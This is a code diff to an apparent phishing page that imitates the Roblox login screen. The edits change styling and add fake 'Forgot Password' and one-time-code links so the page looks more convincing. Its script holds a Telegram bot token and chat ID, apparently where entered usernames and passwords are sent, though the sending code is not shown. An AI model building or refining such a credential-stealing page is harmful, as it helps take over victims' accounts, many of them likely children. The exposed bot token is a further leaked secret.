@@ -25,18 +25,18 @@
         }
         h1 {
             margin-bottom: 20px;
-            font-size: 32px;
-            color: #ffcc00; /* Roblox yellow */
+            font-size: 24px; /* Adjusted size */
+            color: #ffffff; /* White for text */
         }
         input {
             display: block;
             width: calc(100% - 20px); /* Adjusted for padding */
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #444; /* Dark border */
+            border: none;
             border-radius: 6px;
             font-size: 16px;
-            background-color: #555; /* Dark input fields */
+            background-color: #333; /* Dark input fields */
             color: white; /* White text for inputs */
         }
         button {
@@ -58,10 +58,20 @@
             margin-top: 15px;
             color: #ffcc00; /* Yellow for messages */
         }
-        .footer {
+        .footer, .forgot-password {
             margin-top: 20px;
             font-size: 14px;
             color: #ccc; /* Light gray for footer text */
+        }
+        .forgot-password {
+            margin-top: 10px;
+        }
+        .forgot-password a, .footer a {
+            color: #ffcc00;
+            text-decoration: none;
+        }
+        .forgot-password a:hover, .footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -69,18 +79,23 @@
     <div class="login-container">
         <h1>Login to Roblox</h1>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Username" required>
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
         <p id="result"></p>
+        <div class="forgot-password">
+            <p><a href="#">Forgot Password or Username?</a></p>
+            <p><a href="#">Email Me a One-Time Code</a></p>
+            <p><a href="#">Use Another Device</a></p>
+        </div>
         <div class="footer">
-            <p>Don't have an account? <a href="#" style="color: #ffcc00;">Sign Up</a></p>
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
         </div>
     </div>
 
     <script>
-        // Replace these with your actual Telegram Bot Token and Chat ID
+        // Your actual Telegram Bot Token and Chat ID
         const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // Your bot token
         const CHAT_ID = '7072093078'; // Your chat ID
 
